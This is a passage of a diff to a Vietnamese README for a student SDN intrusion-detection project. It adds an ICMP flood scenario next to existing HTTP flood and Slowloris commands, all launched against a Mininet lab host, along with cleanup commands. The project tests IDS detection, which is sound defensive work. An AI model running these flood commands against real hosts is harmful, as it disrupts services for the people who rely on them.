+| `batPack123.py` | Phiên bản tối ưu cho s6-eth1 (17x speedup) | Tháng 4/2026 |
+| `interface_diagnostic.py` | Kiểm tra interface trước khi capture | Tháng 4/2026 |
+| `ids_onos_integration.py` | Module tích hợp IDS + ONOS controller | Tháng 4/2026 |
+| `OPTIMIZATION_COMPLETE.txt` | Báo cáo chi tiết quá trình tối ưu | Tháng 4/2026 |
 
 ---
 
@@ -6066,7 +6448,7 @@ sudo PYTHONPATH=/home/tgf/Documents/DoAn_SDN/sdn_env/lib/python3.12/site-package
     ./sdn_env/bin/python3 system.py
 ```
 
-### **11.2 Các Lệnh Tấn Công (5 Hội)**
+### **11.2 Các Lệnh Tấn Công (5+1 Hội)**
 
 ```bash
 # === HỘI 0: NORMAL TRAFFIC (Baseline) ===
@@ -6093,6 +6475,11 @@ mininet> py [net.get(f'h{i}').cmd('python3 attack/http_flood.py http://10.0.0.10
 # === HỘI 4: SLOWLORIS (L7 Stealth) ===
 mininet> py [net.get(f'h{i}').cmd('python3 attack/slowloris.py http://10.0.0.10:8000 &') 
          for i in range(16, 19)]
+
+# === HỘI 5: ICMP FLOOD (L3 Zero-Day Demo) ===
+# ⚠️ Cần chạy với sudo trên host (không phải trong Mininet)
+# Mục đích: Demo khả năng phát hiện tấn công lạ (không có trong training)
+sudo python3 attack/icmp_flood.py 10.0.0.10 1400
 ```
 
 ### **11.3 Các Lệnh Dừng & Dọn Dẹp**
@@ -6100,6 +6487,9 @@ mininet> py [net.get(f'h{i}').cmd('python3 attack/slowloris.py http://10.0.0.10:
 ```bash
 # Dừng TẤT CẢ tấn công
 mininet> py [net.get(f'h{i}').cmd('pkill -f attack/ &') for i in range(1, 21)]
+
+# Dừng ICMP Flood (chạy trên host)
+sudo pkill -f icmp_flood.py
 
 # Dừng normal traffic
 mininet> py [net.get(f'h{i}').cmd('pkill -f traffic/normal.py') for i in range(60, 66)]
